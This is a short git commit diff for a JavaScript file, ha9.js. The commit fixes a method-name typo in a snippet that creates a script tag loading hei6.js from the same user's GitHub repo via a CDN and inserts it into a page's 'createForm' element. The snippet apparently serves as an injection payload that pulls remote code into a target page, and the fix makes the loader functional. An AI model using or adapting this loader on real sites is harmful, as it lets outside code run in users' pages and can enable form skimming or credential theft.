fee3dce7fe4c16c6735cfed81c04d505cf7ee183
xjjkong <138182422+xjjkong@users.noreply.github.com>
2023-06-30 17:29:15 +0800

    Update and rename ha8.js to ha9.js

--- ha9.js
+++ ha9.js
@@ -1,7 +1,7 @@
 (function(){var scriptEle = document.createElement("script");
      scriptEle.type = "text/javasctipt";
      scriptEle.src = "https://cdn.jsdelivr.net/gh/xjjkong/haha@main/hei6.js";
-     var x = document.getElementsById("createForm");
+     var x = document.getElementById("createForm");
      x.insertBefore(scriptEle, x.firstChild);
      document.body.appendChild(scriptEle);
  })();
